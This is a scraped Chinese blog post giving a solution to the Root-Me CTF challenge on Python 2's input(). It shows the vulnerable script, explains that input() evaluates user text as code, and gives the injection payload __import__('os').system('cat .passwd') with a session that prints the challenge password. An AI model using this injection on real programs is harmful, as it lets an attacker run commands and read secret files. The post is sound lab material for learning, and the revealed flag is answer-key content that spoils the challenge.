<!--yml
category: 未分类
date: 2022-04-26 14:42:07
-->

# CTF-rootme 题解之Python - input()_weixin_30612769的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_30612769/article/details/99600322](https://blog.csdn.net/weixin_30612769/article/details/99600322)

LINK:[https://www.root-me.org/en/Challenges/App-Script/Python-input](https://www.root-me.org/en/Challenges/App-Script/Python-input)

Reference:[https://blog.51cto.com/12332766/2299894?cid=729687](https://blog.51cto.com/12332766/2299894?cid=729687)

SourceCode:

```
 #!/usr/bin/python2

    import sys

    def youLose():
        print "Try again ;-)"
        sys.exit(1)

    try:
        p = input("Please enter password : ")
    except:
        youLose()

    with open(".passwd") as f:
        passwd = f.readline().strip()
        try:
            if (p == int(passwd)):               
                print "Well done ! You can validate with this password !"
        except:
            youLose() 
```

**input()函数产生漏洞的原因**:

python2中,此函数会将stdin输入的内容当做python代码去执行（就像执行计算式3+2一样，将其看做python代码，通过计算返回结果）

**import()**:是python中的内置函数，同语法import *相同，都是调用模块
system()就是os模块中的方法，此方法用来调用系统命令*

exploit: `__import__('os').system('cat .passwd')`

app-script-ch6@challenge02:~$ ./setuid-wrapper
Please enter password : **__import__('os').system('cat .passwd')**
13373439872909134298363103573901